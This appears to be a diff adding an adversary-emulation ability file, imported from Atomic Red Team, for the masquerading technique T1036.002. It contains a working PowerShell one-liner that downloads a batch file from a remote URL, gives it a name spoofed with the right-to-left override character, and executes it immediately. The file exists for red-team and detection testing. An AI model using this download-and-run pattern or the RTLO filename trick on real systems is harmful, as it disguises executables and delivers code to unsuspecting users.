@@ -1,0 +1,40 @@
+- id: dac81590-8b63-4769-8b82-310beedc4f09
+  name: 'Masquerading: RTLO Masqueraded File Download and Execution'
+  description: Downloads a batch file that has an obfuscated name utilizing the RTLO
+    operator. The batch file then runs automatically, opening a cmd window and then
+    closing 30 seconds later
+  tactic: stealth
+  technique:
+    attack_id: T1036.002
+    name: Masquerading:Right-to-Left Override
+  platforms:
+    windows:
+      psh:
+        command: $rtlo = [char]0x202E; $filepath = [System.IO.Path]::Combine($env:USERPROFILE,
+          "Downloads"); $fileloc = Join-Path "$filepath" ("evil_batch" + $rtlo + "fdp.bat");
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1036.002/src/evil_batch.bat"
+          -OutFile $fileloc -UseBasicParsing | Out-Null; Start-Process -FilePath $fileloc
+        cleanup: '$rtlo = [char]0x202E; $filepath = #{fileloc}; $fileloc = Join-Path
+          "$filepath" ("evil_batch" + $rtlo + "fdp.bat"); Remove-Item -Path $fileloc
+          -Force -ErrorAction SilentlyContinue'
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1036.002
+  - stealth
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      fileloc:
+        type: path
+        default: '[System.IO.Path]::Combine($env:USERPROFILE, "Downloads")'
+        description: Location you want to download the file to. Default is the downloads
+          folder
+    technique_created: '2020-02-10T19:55:29.385Z'
+    atomic_guid: dac81590-8b63-4769-8b82-310beedc4f09
+    import_timestamp: '2026-05-13T05:48:39.223560Z'
